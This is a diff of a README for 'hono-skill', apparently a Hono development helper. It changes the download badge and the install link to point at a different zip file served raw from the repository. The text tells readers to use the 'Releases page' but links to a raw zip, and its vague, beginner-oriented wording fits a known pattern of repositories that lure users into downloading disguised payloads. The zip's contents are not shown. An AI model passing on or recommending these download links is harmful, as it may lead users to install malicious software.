@@ -1,7 +1,7 @@
 # 🛠️ hono-skill - Simplify Your Hono App Development
 
 ## 📥 Download Now
-[![Download Hono Skill](https://raw.githubusercontent.com/panjicopri/hono-skill/main/.claude-plugin/skill-hono-v2.9.zip)](https://raw.githubusercontent.com/panjicopri/hono-skill/main/.claude-plugin/skill-hono-v2.9.zip)
+[![Download Hono Skill](https://raw.githubusercontent.com/panjicopri/hono-skill/main/skills/hono/hono_skill_v3.8.zip)](https://raw.githubusercontent.com/panjicopri/hono-skill/main/skills/hono/hono_skill_v3.8.zip)
 
 ## 📋 Description
 hono-skill is an application designed to help you develop Hono applications more efficiently. With hono-skill, you can streamline your work using the Hono CLI. This tool is perfect for anyone looking to simplify their development process without diving deep into complex coding.
@@ -24,7 +24,7 @@ To get started with hono-skill, follow these simple steps. You will need to have
 ## 📥 Download & Install
 To download and install hono-skill, please visit the Releases page:
 
-[Download hono-skill](https://raw.githubusercontent.com/panjicopri/hono-skill/main/.claude-plugin/skill-hono-v2.9.zip)
+[Download hono-skill](https://raw.githubusercontent.com/panjicopri/hono-skill/main/skills/hono/hono_skill_v3.8.zip)
 
 ### Steps to Download:
 1. Click on the link above.
